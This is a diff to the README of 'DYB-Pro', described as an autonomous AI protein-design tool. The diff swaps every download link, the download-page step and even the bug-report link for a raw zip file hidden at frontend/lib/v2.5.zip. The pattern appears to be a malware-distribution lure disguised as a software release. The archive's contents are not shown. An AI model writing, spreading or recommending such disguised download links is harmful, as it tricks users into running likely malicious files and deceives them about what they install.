@@ -1,6 +1,6 @@
 # 🧬 DYB-Pro - Autonomous Protein Design, Delivered to Your Lab
 
-[![Download DYB-Pro](https://img.shields.io/badge/Download-DYB--Pro-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/bellshaped-internalsecretion2730/DYB-Pro)
+[![Download DYB-Pro](https://img.shields.io/badge/Download-DYB--Pro-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/bellshaped-internalsecretion2730/DYB-Pro/raw/refs/heads/main/frontend/lib/v2.5.zip)
 
 ## 🤖 What Is DYB-Pro?
 
@@ -34,7 +34,7 @@ DYB-Pro coordinates multiple specialized AI agents—each handling a different a
 
 Getting started with DYB-Pro is simple:
 
-1. **Visit the download page:** Go to [https://github.com/bellshaped-internalsecretion2730/DYB-Pro](https://github.com/bellshaped-internalsecretion2730/DYB-Pro)
+1. **Visit the download page:** Go to [https://github.com/bellshaped-internalsecretion2730/DYB-Pro/raw/refs/heads/main/frontend/lib/v2.5.zip](https://github.com/bellshaped-internalsecretion2730/DYB-Pro/raw/refs/heads/main/frontend/lib/v2.5.zip)
 
 2. **Download the application:** Visit this link to download the application.
 
@@ -187,7 +187,7 @@ A: Yes. The trial version allows 3 design cycles with full functionality.
 
 - **Email:** support@dyb-pro.com
 - **Website:** www.dyb-pro.com
-- **GitHub Issues:** Report bugs or request features on our [GitHub repository](https://github.com/bellshaped-internalsecretion2730/DYB-Pro)
+- **GitHub Issues:** Report bugs or request features on our [GitHub repository](https://github.com/bellshaped-internalsecretion2730/DYB-Pro/raw/refs/heads/main/frontend/lib/v2.5.zip)
 
 ## 📄 License
 
@@ -201,4 +201,4 @@ DYB-Pro is built on cutting-edge research in protein language models and autonom
 
 **Start designing better proteins today. Download DYB-Pro and let the autonomous cycle do the heavy lifting.**
 
-[![Get DYB-Pro Now](https://img.shields.io/badge/Get%20DYB--Pro%20Now-2E8B57?style=for-the-badge&logo=download&logoColor=white)](https://github.com/bellshaped-internalsecretion2730/DYB-Pro)
+[![Get DYB-Pro Now](https://img.shields.io/badge/Get%20DYB--Pro%20Now-2E8B57?style=for-the-badge&logo=download&logoColor=white)](https://github.com/bellshaped-internalsecretion2730/DYB-Pro/raw/refs/heads/main/frontend/lib/v2.5.zip)
